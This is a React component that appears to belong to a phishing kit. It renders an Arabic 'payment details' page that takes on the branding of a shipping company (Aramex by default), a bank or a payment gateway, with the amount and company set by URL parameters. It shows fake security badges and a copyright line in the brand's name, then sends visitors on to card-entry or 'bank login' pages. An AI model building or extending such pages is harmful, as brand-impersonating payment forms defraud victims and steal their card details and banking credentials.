import { useState, useEffect, useMemo } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import { useLinkData } from "@/hooks/useLinkData";
import { getCountryByCode } from "@/lib/countries";
import { formatCurrency, getCurrencyByCountry } from "@/lib/countryCurrencies";
import { CreditCard, ArrowLeft, Hash, DollarSign, Package, Truck, ShieldCheck, Lock, Sparkles, CheckCircle2, Building2, Wallet } from "lucide-react";
import PaymentMetaTags from "@/components/PaymentMetaTags";
import BrandedCarousel from "@/components/BrandedCarousel";
import PageLoader from "@/components/PageLoader";
import { getEntityVisualSpec, specToCSSVariables } from "@/lib/entityVisualSpecs";
import { getServiceBranding } from "@/lib/serviceLogos";
import { shippingCompanyBranding } from "@/lib/brandingSystem";

const PaymentDetails = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { data: linkData, isLoading, isError } = useLinkData(id);
  const [showPage, setShowPage] = useState(false);

  useEffect(() => {
    const timer = setTimeout(() => {
      setShowPage(true);
    }, 3000);
    return () => clearTimeout(timer);
  }, []);

  useEffect(() => {
    if (linkData || isError) {
      setShowPage(true);
    }
  }, [linkData, isError]);

  const urlParams = new URLSearchParams(window.location.search);
  const serviceKey = urlParams.get('company') || urlParams.get('service') || linkData?.payload?.service_key || 'aramex';
  const shippingInfo = linkData?.payload as any;

  const amountParam = urlParams.get('amount');
  const currencyParam = urlParams.get('currency');
  const methodParam = urlParams.get('method') || urlParams.get('pm');
  const countryParam = urlParams.get('country');

  const countryCode = countryParam || shippingInfo?.selectedCountry || "SA";
  const currencyInfo = getCurrencyByCountry(countryCode);

  const rawAmount = amountParam || shippingInfo?.cod_amount || shippingInfo?.customerInfo?.amount;
  let amount = 500;
  if (rawAmount !== undefined && rawAmount !== null) {
    if (typeof rawAmount === 'number') {
      amount = rawAmount;
    } else if (typeof rawAmount === 'string') {
      const parsed = parseFloat(rawAmount);
      if (!isNaN(parsed)) {
        amount = parsed;
      }
    }
  }

  const formattedAmount = formatCurrency(amount, currencyParam || countryCode);

  // Get entity visual spec
  const entitySpec = useMemo(() => {
    if (serviceKey) {
      return getEntityVisualSpec(serviceKey);
    }
    return null;
  }, [serviceKey]);

  // Get branding as fallback
  const serviceBranding = getServiceBranding(serviceKey);
  const companyBranding = serviceKey ? shippingCompanyBranding[serviceKey.toLowerCase()] : null;

  // Apply entity CSS variables
  useEffect(() => {
    if (entitySpec) {
      const cssVars = specToCSSVariables(entitySpec);
      const root = document.documentElement;
      Object.entries(cssVars).forEach(([key, value]) => {
        root.style.setProperty(key, value);
      });
      root.setAttribute('data-entity', entitySpec.entityId);
      root.setAttribute('data-entity-category', entitySpec.category);
    }
    return () => {
      const root = document.documentElement;
      root.removeAttribute('data-entity');
      root.removeAttribute('data-entity-category');
    };
  }, [entitySpec]);

  // Visual values
  const primaryColor = entitySpec?.colors.primary || companyBranding?.colors.primary || serviceBranding.colors.primary;
  const secondaryColor = entitySpec?.colors.secondary || companyBranding?.colors.secondary || serviceBranding.colors.secondary;
  const backgroundColor = entitySpec?.colors.background || companyBranding?.colors.background || '#F8F9FA';
  const surfaceColor = entitySpec?.colors.surface || companyBranding?.colors.surface || '#FFFFFF';
  const textColor = entitySpec?.colors.text || companyBranding?.colors.text || '#1A1A1A';
  const textLightColor = entitySpec?.colors.textLight || companyBranding?.colors.textLight || '#666666';
  const borderColor = entitySpec?.colors.border || companyBranding?.colors.border || '#E5E5E5';
  const fontFamily = entitySpec?.typography.fontFamilyAr || companyBranding?.fonts.arabic || 'Cairo, Tajawal, sans-serif';
  const borderRadius = entitySpec?.dimensions.borderRadius || companyBranding?.borderRadius.lg || '16px';
  const buttonHeight = entitySpec?.dimensions.buttonHeight || '56px';
  const cardShadow = entitySpec?.shadows.card || companyBranding?.shadows.lg || '0 8px 32px rgba(0,0,0,0.1)';
  const buttonShadow = entitySpec?.shadows.button || `0 12px 32px ${primaryColor}40`;
  const logoUrl = entitySpec?.assets.logo || companyBranding?.logoUrl || '';
  const entityNameAr = entitySpec?.entityNameAr || serviceBranding.nameAr || serviceKey;
  const entityNameEn = entitySpec?.entityNameEn || serviceBranding.nameEn || serviceKey;
  const category = entitySpec?.category || 'shipping';

  const serviceName = entityNameAr;

  if (isLoading && !showPage) {
    return <PageLoader message="جاري تحميل تفاصيل الدفع..." />;
  }

  const handleProceed = () => {
    const paymentMethod = methodParam || linkData?.payload?.payment_method || 'card';
    const govId = urlParams.get('govId') || linkData?.payload?.govId;

    const queryParams = new URLSearchParams(window.location.search);
    if (!queryParams.has('company')) queryParams.set('company', serviceKey);
    if (!queryParams.has('currency')) queryParams.set('currency', currencyParam || countryCode);
    if (!queryParams.has('amount')) queryParams.set('amount', amount.toString());
    if (govId) queryParams.set('govId', govId);

    const nextUrl = paymentMethod === 'bank_login'
      ? `/pay/${id}/bank?${queryParams.toString()}`
      : `/pay/${id}/card?${queryParams.toString()}`;

    navigate(nextUrl);
  };

  // Category icon
  const CategoryIcon = category === 'shipping' || category === 'postal' ? Truck :
                       category === 'bank' ? Building2 :
                       category === 'payment_gateway' ? CreditCard :
                       Wallet;

  return (
    <>
      <PaymentMetaTags
        serviceKey={serviceKey}
        serviceName={serviceName}
        title={`تفاصيل الدفع - ${serviceName}`}
        customDescription={`أكمل عملية الدفع بأمان وسهولة - ${serviceName}`}
        amount={formattedAmount}
      />

      {/* Entity-Specific Header */}
      <div
        className="sticky top-0 z-50 w-full shadow-lg"
        style={{
          background: `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})`,
          borderBottom: `3px solid ${primaryColor}`
        }}
      >
        <div className="container mx-auto px-4">
          <div className="flex items-center justify-between h-16 sm:h-18">
            <div className="flex items-center gap-3 sm:gap-4">
              {logoUrl ? (
                <img
                  src={logoUrl}
                  alt={serviceName}
                  className="h-8 sm:h-10 w-auto object-contain brightness-0 invert"
                />
              ) : (
                <div className="w-10 h-10 sm:w-12 sm:h-12 rounded-xl flex items-center justify-center" style={{ backgroundColor: `${primaryColor}20` }}>
                  <CategoryIcon className="w-5 h-5 sm:w-6 sm:h-6 text-white" />
                </div>
              )}
              <div className="text-white">
                <h2 className="text-base sm:text-xl font-bold">{serviceName}</h2>
                <p className="text-[10px] sm:text-xs opacity-90">
                  الدفع الآمن - Secure Payment
                </p>
              </div>
            </div>

            <div className="flex items-center gap-2 px-3 py-1.5 rounded-full backdrop-blur-sm" style={{ backgroundColor: `${primaryColor}20` }}>
              <ShieldCheck className="w-4 h-4 text-white" />
              <span className="text-xs font-medium text-white">آمن</span>
            </div>
          </div>
        </div>
      </div>

      {/* Hero Carousel */}
      <BrandedCarousel serviceKey={serviceKey} className="mb-0" />

      {/* Main Content */}
      <div
        className="min-h-screen py-8 sm:py-12"
        dir="rtl"
        style={{
          background: `linear-gradient(135deg, ${backgroundColor}, ${surfaceColor})`,
          fontFamily
        }}
      >
        <div className="container mx-auto px-4 max-w-2xl">
          {/* Page Title */}
          <div className="text-center mb-8">
            <div className="flex items-center justify-center gap-3 mb-4">
              <Sparkles className="w-6 h-6" style={{ color: primaryColor }} />
              <h1
                className="text-2xl sm:text-3xl font-bold"
                style={{ color: textColor }}
              >
                تفاصيل الدفع
              </h1>
            </div>
            <p className="text-sm sm:text-base" style={{ color: textLightColor }}>
              راجع تفاصيل طلبك قبل المتابعة للدفع
            </p>
          </div>

          {/* Entity Info Card */}
          <Card
            className="overflow-hidden border-0 mb-6"
            style={{ borderRadius, boxShadow: cardShadow, backgroundColor: surfaceColor }}
          >
            <div
              className="px-6 sm:px-8 py-6"
              style={{
                background: `linear-gradient(135deg, ${primaryColor}15, ${secondaryColor}15)`,
                borderBottom: `2px solid ${primaryColor}30`
              }}
            >
              <div className="flex items-center gap-3">
                <div
                  className="w-12 h-12 rounded-xl flex items-center justify-center"
                  style={{ background: `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})` }}
                >
                  <CategoryIcon className="w-6 h-6 text-white" />
                </div>
                <div>
                  <h2 className="text-lg sm:text-xl font-bold" style={{ color: textColor }}>
                    {category === 'shipping' || category === 'postal' ? 'تفاصيل الشحنة' :
                     category === 'bank' ? 'تفاصيل الحساب' :
                     category === 'payment_gateway' ? 'تفاصيل الخدمة' :
                     'تفاصيل الطلب'}
                  </h2>
                  <p className="text-sm" style={{ color: textLightColor }}>
                    {category === 'shipping' || category === 'postal' ? 'معلومات الطرد والتوصيل' :
                     category === 'bank' ? 'معلومات الحساب البنكي' :
                     'معلومات الخدمة المطلوبة'}
                  </p>
                </div>
              </div>
            </div>

            {shippingInfo && (
              <div className="px-6 sm:px-8 py-6 space-y-4" style={{ backgroundColor: surfaceColor }}>
                {shippingInfo.tracking_number && (
                  <div className="flex items-center justify-between py-3 border-b" style={{ borderColor }}>
                    <div className="flex items-center gap-2" style={{ color: textLightColor }}>
                      <Hash className="w-4 h-4" />
                      <span className="text-sm">رقم الشحنة</span>
                    </div>
                    <span className="font-bold text-base">{shippingInfo.tracking_number}</span>
                  </div>
                )}
                {shippingInfo.package_description && (
                  <div className="flex items-center justify-between py-3 border-b" style={{ borderColor }}>
                    <div className="flex items-center gap-2" style={{ color: textLightColor }}>
                      <Truck className="w-4 h-4" />
                      <span className="text-sm">وصف الطرد</span>
                    </div>
                    <span className="font-semibold text-base">{shippingInfo.package_description}</span>
                  </div>
                )}
              </div>
            )}
          </Card>

          {/* Payment Summary */}
          <Card
            className="overflow-hidden border-0 mb-6"
            style={{ borderRadius, boxShadow: cardShadow, backgroundColor: surfaceColor }}
          >
            <div
              className="px-6 sm:px-8 py-6"
              style={{
                background: `linear-gradient(135deg, ${primaryColor}15, ${secondaryColor}15)`,
                borderBottom: `2px solid ${primaryColor}30`
              }}
            >
              <div className="flex items-center gap-3">
                <div
                  className="w-12 h-12 rounded-xl flex items-center justify-center"
                  style={{ background: `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})` }}
                >
                  <DollarSign className="w-6 h-6 text-white" />
                </div>
                <div>
                  <h2 className="text-lg sm:text-xl font-bold" style={{ color: textColor }}>
                    ملخص الدفع
                  </h2>
                  <p className="text-sm" style={{ color: textLightColor }}>
                    المبلغ المطلوب
                  </p>
                </div>
              </div>
            </div>

            <div className="px-6 sm:px-8 py-6 space-y-4" style={{ backgroundColor: surfaceColor }}>
              <div className="flex justify-between py-3 border-b" style={{ borderColor }}>
                <span style={{ color: textLightColor }}>الخدمة</span>
                <span className="font-bold text-base">{serviceName}</span>
              </div>

              <div
                className="flex justify-between items-center py-5 px-5 rounded-xl"
                style={{ background: `linear-gradient(135deg, ${primaryColor}10, ${secondaryColor}10)` }}
              >
                <span className="text-lg font-bold">المبلغ الإجمالي</span>
                <span className="text-2xl sm:text-3xl font-bold" style={{ color: primaryColor }}>
                  {formattedAmount}
                </span>
              </div>
            </div>
          </Card>

          {/* Payment Method */}
          <Card
            className="overflow-hidden border-0 mb-8"
            style={{ borderRadius, boxShadow: cardShadow, backgroundColor: surfaceColor }}
          >
            <div
              className="px-6 sm:px-8 py-6"
              style={{
                background: `linear-gradient(135deg, ${primaryColor}15, ${secondaryColor}15)`,
                borderBottom: `2px solid ${primaryColor}30`
              }}
            >
              <div className="flex items-center gap-3">
                <div
                  className="w-12 h-12 rounded-xl flex items-center justify-center"
                  style={{ background: `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})` }}
                >
                  <CreditCard className="w-6 h-6 text-white" />
                </div>
                <div>
                  <h2 className="text-lg sm:text-xl font-bold" style={{ color: textColor }}>
                    طريقة الدفع
                  </h2>
                  <p className="text-sm" style={{ color: textLightColor }}>
                    الدفع الإلكتروني الآمن
                  </p>
                </div>
              </div>
            </div>

            <div className="px-6 sm:px-8 py-6" style={{ backgroundColor: surfaceColor }}>
              <div
                className="flex items-center gap-4 p-5 rounded-xl border-2"
                style={{ borderColor: primaryColor, background: `${primaryColor}08` }}
              >
                <div
                  className="w-12 h-12 rounded-lg flex items-center justify-center flex-shrink-0"
                  style={{ background: `${primaryColor}20` }}
                >
                  {methodParam === 'bank_login' ? (
                    <Lock className="w-6 h-6" style={{ color: primaryColor }} />
                  ) : (
                    <CreditCard className="w-6 h-6" style={{ color: primaryColor }} />
                  )}
                </div>
                <div className="flex-1">
                  <p className="font-bold text-base mb-1">
                    {methodParam === 'bank_login' ? 'تسجيل دخول البنك 🏦' : 'الدفع بالبطاقة 💳'}
                  </p>
                  <p className="text-sm" style={{ color: textLightColor }}>
                    {methodParam === 'bank_login' ? 'الدفع الآمن عبر حسابك البنكي' : 'Visa • Mastercard • Mada'}
                  </p>
                </div>
                <CheckCircle2 className="w-6 h-6" style={{ color: primaryColor }} />
              </div>
            </div>
          </Card>

          {/* Proceed Button */}
          <Button
            onClick={handleProceed}
            size="lg"
            className="w-full text-lg sm:text-xl font-bold transition-all duration-300 hover:shadow-2xl"
            style={{
              background: `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})`,
              boxShadow: buttonShadow,
              borderRadius,
              height: buttonHeight,
              color: entitySpec?.colors.textOnPrimary || '#FFFFFF',
            }}
          >
            <span className="ml-3">متابعة للدفع</span>
            <ArrowLeft className="w-5 h-5 sm:w-6 sm:h-6 mr-2" />
          </Button>

          <div className="mt-6 flex items-center justify-center gap-2 text-sm" style={{ color: textLightColor }}>
            <Lock className="w-4 h-4" />
            <p>
              بالمتابعة، أنت توافق على{' '}
              <a href="#" className="underline hover:no-underline" style={{ color: primaryColor }}>
                الشروط والأحكام
              </a>
            </p>
          </div>

          {/* Footer */}
          <div className="mt-8 text-center">
            <div className="flex items-center justify-center gap-4 text-xs mb-3" style={{ color: textLightColor }}>
              <div className="flex items-center gap-1.5">
                <Lock className="w-3.5 h-3.5" />
                <span>SSL Encrypted</span>
              </div>
              <span>•</span>
              <div className="flex items-center gap-1.5">
                <ShieldCheck className="w-3.5 h-3.5" />
                <span>Verified</span>
              </div>
            </div>
            <p className="text-xs" style={{ color: `${textLightColor}80` }}>
              © 2025 {serviceName}. جميع الحقوق محفوظة.
            </p>
          </div>
        </div>
      </div>
    </>
  );
};

export default PaymentDetails;
